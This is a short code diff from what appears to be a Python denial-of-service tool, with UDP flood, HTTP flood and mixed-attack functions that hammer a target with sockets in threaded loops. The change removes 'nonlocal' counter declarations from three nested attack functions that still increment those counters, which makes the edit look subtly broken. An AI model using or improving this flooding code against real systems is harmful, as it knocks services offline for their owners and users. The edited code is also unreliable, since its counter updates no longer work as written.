@@ -211,7 +211,6 @@ def udp_flood_enhanced(target, port, duration, threads):
     attack_running = True
 
     def send_udp():
-        nonlocal request_count, success_count, failed_count
         while attack_running and time.time() < end_time:
             try:
                 # Create a new socket for each packet
@@ -293,7 +292,6 @@ def mixed_attack(target, port, duration, threads):
     ]
 
     def http_attack():
-        nonlocal request_count, success_count, failed_count
         while attack_running and time.time() < end_time:
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -326,7 +324,6 @@ def mixed_attack(target, port, duration, threads):
                 failed_count += 1
 
     def udp_attack():
-        nonlocal request_count, success_count, failed_count
         while attack_running and time.time() < end_time:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
